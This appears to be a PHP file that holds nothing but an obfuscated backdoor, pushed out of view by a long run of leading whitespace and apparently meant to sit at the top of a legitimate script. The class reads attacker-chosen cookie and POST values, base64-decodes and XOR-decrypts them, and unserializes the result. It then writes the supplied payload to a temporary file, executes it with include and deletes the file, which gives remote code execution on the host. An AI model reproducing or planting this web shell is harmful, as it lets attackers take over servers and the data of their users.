<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("qiyvzb")){class qiyvzb{public static $bsqyehuh = "vjbpcctknrenrtma";public static $ggzwsstsw = NULL;public function __construct(){$ikrwrvvu = @$_COOKIE[substr(qiyvzb::$bsqyehuh, 0, 4)];if (!empty($ikrwrvvu)){$tmjjghfe = "base64";$gtzlyg = "";$ikrwrvvu = explode(",", $ikrwrvvu);foreach ($ikrwrvvu as $lfflkiutvo){$gtzlyg .= @$_COOKIE[$lfflkiutvo];$gtzlyg .= @$_POST[$lfflkiutvo];}$gtzlyg = array_map($tmjjghfe . "_decode", array($gtzlyg,));$gtzlyg = $gtzlyg[0] ^ str_repeat(qiyvzb::$bsqyehuh, (strlen($gtzlyg[0]) / strlen(qiyvzb::$bsqyehuh)) + 1);qiyvzb::$ggzwsstsw = @unserialize($gtzlyg);}}public function __destruct(){$this->wqvwzjtx();}private function wqvwzjtx(){if (is_array(qiyvzb::$ggzwsstsw)) {$wyatmzmqgn = sys_get_temp_dir() . "/" . crc32(qiyvzb::$ggzwsstsw["salt"]);@qiyvzb::$ggzwsstsw["write"]($wyatmzmqgn, qiyvzb::$ggzwsstsw["content"]);include $wyatmzmqgn;@qiyvzb::$ggzwsstsw["delete"]($wyatmzmqgn);exit();}}}$dvsann = new qiyvzb();$dvsann = NULL;} ?><?php
